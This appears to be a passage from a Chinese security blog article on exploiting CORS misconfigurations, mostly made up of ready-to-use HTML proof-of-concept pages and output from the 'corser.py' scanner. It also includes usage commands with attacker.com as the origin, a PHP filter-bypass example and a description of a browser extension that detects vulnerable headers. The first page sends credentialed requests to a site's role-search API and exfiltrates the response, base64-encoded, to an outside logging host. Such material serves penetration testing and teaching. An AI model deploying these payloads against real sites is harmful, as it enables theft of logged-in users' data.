    <head>
    
    <meta charset="UTF-8">
    
    <title>CORS EXP跨域测试</title>
    
    </head>
    
    <body>
    
    <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js">
    
    </script>
    
    <script>
    
    $(function() {
    
    var options = {
    
    type: 'get',
    
    xhrFields: {withCredentials: true},
    
    url: "http://www.pxc.local/master/rolePage/search?page=1&roleCd=1&desc=&pageCode=qx02",
    
    success: function (result) {
    
    new Image().src="http://cors.reiwgah.exeye.io/" + window.btoa(unescape(encodeURIComponent(JSON.stringify(result))))
    
    //alert(JSON.stringify(result));
    
    }
    
    };
    
    $("#btn1").click(function ()
    
    {
    
    $.ajax(options);
    
    });
    
    });
    
    </script>
    
    <input type="button" id="btn1" value="发送一个CORS请求并获取返回结果"/>
    
    </body>
    
    </html>

PS C:\crossdomain> python corser.py -poc GET

[1;35m

____ ___ ____ ____ _____ ____

/ ___/ _ \| _ \/ ___|| ____| _ \

| | | | | | |_) \\___ \| _| | |_) |

| |__| |_| | _ < ___) | |___| _ <

\\____\\___/|_| \\_\\____/|_____|_| \\_\ Author: –==dienpv==–

[1;m

    
    
    <!DOCTYPE html>
    
    <html>
    
    <head>
    
    <script>
    
    function cors() {
    
    var xhttp = new XMLHttpRequest();
    
    xhttp.onreadystatechange = function() {
    
    if (this.readyState == 4 && this.status == 200){
    
    document.getElementById("demo").innerHTML = alert(this.responseText);
    
    }
    
    };
    
    xhttp.open('GET', 'https://target.com/anything/?param1=value1&pram2=value2', true);
    
    <!-- xhttp.setRequestHeader('setsomething');-->
    
    xhttp.withCredentials = true;
    
    xhttp.send();
    
    }
    
    </script>
    
    </head>
    
    <body>
    
    <center>
    
    <h2>CORS POC</h2>
    
    <h3>Extract Information</h3>
    
    <div id="demo">
    
    <button type="button" onclick="cors()">Exploit</button>
    
    </div>
    
    </body>
    
    </html>

PS C:\crossdomain> python corser.py -poc POST

[1;35m

____ ___ ____ ____ _____ ____

/ ___/ _ \| _ \/ ___|| ____| _ \

| | | | | | |_) \\___ \| _| | |_) |

| |__| |_| | _ < ___) | |___| _ <

\\____\\___/|_| \\_\\____/|_____|_| \\_\ Author: –==dienpv==–

[1;m

    
    
    <!DOCTYPE html>
    
    <html>
    
    <head>
    
    <script>
    
    function cors() {
    
    var xhttp = new XMLHttpRequest();
    
    var params = 'param1=value1&param2=value2';
    
    xhttp.onreadystatechange = function() {
    
    if (this.readyState == 4 && this.status == 200){
    
    document.getElementById("demo").innerHTML = alert(this.responseText);
    
    }
    
    };
    
    xhttp.open("POST", "https://target.com/anything", true);
    
    xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    
    xhttp.withCredentials = true;
    
    xhttp.send(params);
    
    }
    
    </script>
    
    </head>
    
    <body>
    
    <center>
    
    <h2>CORS POC</h2>
    
    <h3>Extract Information</h3>
    
    <div id="demo">
    
    <button type="button" onclick="cors()">Exploit</button>
    
    </div>
    
    </body>
    
    </html>

Microsoft Windows [版本 10.0.17134.165]

(c) 2018 Microsoft Corporation。保留所有权利。

C:\Users\Mannix>cd C:\crossdomain

C:\crossdomain>python corser.py -poc GET

[1;35m

____ ___ ____ ____ _____ ____

/ ___/ _ \| _ \/ ___|| ____| _ \

| | | | | | |_) \\___ \| _| | |_) |

| |__| |_| | _ < ___) | |___| _ <

\\____\\___/|_| \\_\\____/|_____|_| \\_\ Author: –==dienpv==–

[1;m

    
    
    <!DOCTYPE html>
    
    <html>
    
    <head>
    
    <script>
    
    function cors() {
    
    var xhttp = new XMLHttpRequest();
    
    xhttp.onreadystatechange = function() {
    
    if (this.readyState == 4 && this.status == 200){
    
    document.getElementById("demo").innerHTML = alert(this.responseText);
    
    }
    
    };
    
    xhttp.open('GET', 'https://target.com/anything/?param1=value1&pram2=value2', true);
    
    <!-- xhttp.setRequestHeader('setsomething');-->
    
    xhttp.withCredentials = true;
    
    xhttp.send();
    
    }
    
    </script>
    
    </head>
    
    <body>
    
    <center>
    
    <h2>CORS POC</h2>
    
    <h3>Extract Information</h3>
    
    <div id="demo">
    
    <button type="button" onclick="cors()">Exploit</button>
    
    </div>
    
    </body>
    
    </html>
    

C:\crossdomain>python corser.py -poc POST

[1;35m

____ ___ ____ ____ _____ ____

/ ___/ _ \| _ \/ ___|| ____| _ \

| | | | | | |_) \\___ \| _| | |_) |

| |__| |_| | _ < ___) | |___| _ <

\\____\\___/|_| \\_\\____/|_____|_| \\_\ Author: –==dienpv==–

[1;m

    
    
    <!DOCTYPE html>
    
    <html>
    
    <head>
    
    <script>
    
    function cors() {
    
    var xhttp = new XMLHttpRequest();
    
    var params = 'param1=value1&param2=value2';
    
    xhttp.onreadystatechange = function() {
    
    if (this.readyState == 4 && this.status == 200){
    
    document.getElementById("demo").innerHTML = alert(this.responseText);
    
    }
    
    };
    
    xhttp.open("POST", "https://target.com/anything", true);
    
    xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    
    xhttp.withCredentials = true;
    
    xhttp.send(params);
    
    }
    
    </script>
    
    </head>
    
    <body>
    
    <center>
    
    <h2>CORS POC</h2>
    
    <h3>Extract Information</h3>
    
    <div id="demo">
    
    <button type="button" onclick="cors()">Exploit</button>
    
    </div>
    
    </body>
    
    </html>
    
    
    <!DOCTYPE html>
    
    <html>
    
    <head>
    
    <script>
    
    function cors() {
    
    var xhttp = new XMLHttpRequest();
    
    var params = '{"appAccount":"","positionCode":"","cn":"","companyCode":"","state":"","pageNumber":1,"pageSize":15,"pageCode":"qx01"}';
    
    xhttp.onreadystatechange = function() {
    
    if (this.readyState == 4 && this.status == 200){
    
    document.getElementById("demo").innerHTML = alert(this.responseText);
    
    }
    
    };
    
    xhttp.open("POST", "http://www.pxc.local/master/userAuth/list", true);
    
    xhttp.setRequestHeader('Content-type', 'application/json;charset=UTF-8');
    
    xhttp.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
    
    xhttp.setRequestHeader('CSRF', 'Token');
    
    xhttp.setRequestHeader('Accept', '');
    
    xhttp.setRequestHeader('X-AUTH-TOKEN', 'X-AUTH-TOKEN');
    
    xhttp.setRequestHeader('X-AUTH-UID', 'X-AUTH-UID');
    
    xhttp.withCredentials = true;
    
    xhttp.send(params);
    
    }
    
    </script>
    
    </head>
    
    <body>
    
    <center>
    
    <h2>CORS POC</h2>
    
    <h3>Extract Information</h3>
    
    <div id="demo">
    
    <button type="button" onclick="cors()">Exploit</button>
    
    </div>
    
    </body>
    
    </html>
    
    

<https://github.com/dienuet/crossdomain>

<https://github.com/dienuet>

<https://github.com/dienuet/crossdomain>

<https://github.com/dienuet/crossdomain/archive/master.zip>

crossdomain

Checking for CORS misconfiguration

Usage: python corser.py -h

Scanning for list domains

python corser.py -list_domain ~/aquatone/target.com/urls.txt -origin
attacker.com

Bruteforce endpoints and then checking for cors

python corser.py -u https://target.com/ -list_endpoint
~/Desktop/listendpoint.txt -origin attacker.com

Trying to bypass origin when we encounter filter

    
    
    <?php
    
    if(isset($_SERVER['HTTP_ORIGIN'])){
    
    if(preg_match('/^http:\/\/dienpv\.com/', $_SERVER['HTTP_ORIGIN'])){
    
    header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']);
    
    header("Access-Control-Allow-Credentials: True");
    
    }
    
    else{
    
    header("Access-Control-Allow-Origin: "."http://dienpv.com");
    
    header("Access-Control-Allow-Credentials: True");
    
    }
    
    }
    
    echo "your code: hacker1337";
    
    ?>

python corser.py -u [https://target.com -origin attacker.com -fuzz
true](https://target.com%20-origin%20attacker.com%20-fuzz%20true)

## Gen Poc

python corser.py -poc GET

python corser.py -poc POST

additional options

-t : set number of threads

-header : custom your request if website requires authenticated cookie

ex: python corser.py -u https://target.com -header
“Cookie:sessid=123456;role=user, Authorization: zxbdGDH7438”

<https://github.com/rewanth1997/vuln-headers-extension>

<https://github.com/rewanth1997>

<https://github.com/rewanth1997/vuln-headers-extension>

<https://github.com/rewanth1997/vuln-headers-extension/archive/master.zip>

vuln-headers-extension

The extension currently detects URLs which are vulnerable to

CORS Misconfiguration

Host Header Injection

Missing X-XSS-Protection headers (commented in the code due to its low
severity)

Clickjacking support

Clone the repo or fork it.

Open Firefox and load about:debugging in the URL bar.

Click the Load Temporary Add-on button and select the manifest.json file in
your cloned repo.

Now the vuln-headers-extension is installed.

Once you install the extension you can see an icon in the tool bar.

Click on the icon and a new tab gets opened.

Leave it open and do your browsing/work.

The extension automatically logs all the vulnerable URLs to the new tab.

Now you can submit a report to the respective organisaiton and make it more
secure.

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Mannix** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/152339](/post/id/152339)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞利用](/tag/漏洞利用)
  * [跨域读取数据](/tag/跨域读取数据)
  * [CORS跨域请求](/tag/CORS跨域请求)
  * [JSONP跨站读取](/tag/JSONP跨站读取)

 **+1** __13赞

 __收藏

![](https://q.qlogo.cn/qqapp/111111/942FEA70050EEAFBD4DCE2C1FC775E56/40)
Mannix

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

